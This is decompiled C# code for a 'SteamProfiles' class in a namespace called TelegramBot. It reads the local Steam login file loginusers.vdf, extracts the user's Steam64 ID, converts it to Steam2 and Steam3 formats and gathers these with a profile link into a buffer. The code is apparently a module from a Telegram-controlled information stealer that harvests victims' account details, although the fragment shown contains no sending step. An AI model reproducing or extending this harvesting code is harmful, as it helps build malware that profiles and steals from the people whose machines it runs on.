using System;
using System.Globalization;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

namespace TelegramBot
{
	// Token: 0x020000F4 RID: 244
	public class SteamProfiles
	{
		// Token: 0x0600033F RID: 831 RVA: 0x00026430 File Offset: 0x00024630
		public static string GetSteamID()
		{
			string result;
			try
			{
				if (!File.Exists(SteamProfiles.LoginFile))
				{
					result = null;
				}
				else
				{
					string text = File.ReadAllLines(SteamProfiles.LoginFile)[2].Split(new char[]
					{
						'"'
					})[1];
					if (Regex.IsMatch(text, "^7656119([0-9]{10})$"))
					{
						string str = SteamConverter.FromSteam64ToSteam2(Convert.ToInt64(text));
						string str2 = "U:1:" + SteamConverter.FromSteam64ToSteam32(Convert.ToInt64(text)).ToString(CultureInfo.InvariantCulture);
						SteamProfiles.SB.AppendLine("Steam2 ID: " + str);
						SteamProfiles.SB.AppendLine("Steam3 ID x32: " + str2);
						SteamProfiles.SB.AppendLine("Steam3 ID x64: " + text);
						SteamProfiles.SB.AppendLine("https://steamcommunity.com/profiles/" + text);
						result = SteamProfiles.SB.ToString();
					}
					else
					{
						result = null;
					}
				}
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x0400056C RID: 1388
		private static readonly string LoginFile = Path.Combine(SteamPath.GetLocationSteam("InstallPath", "SourceModInstallPath"), "config\\loginusers.vdf");

		// Token: 0x0400056D RID: 1389
		private static StringBuilder SB = new StringBuilder();
	}
}
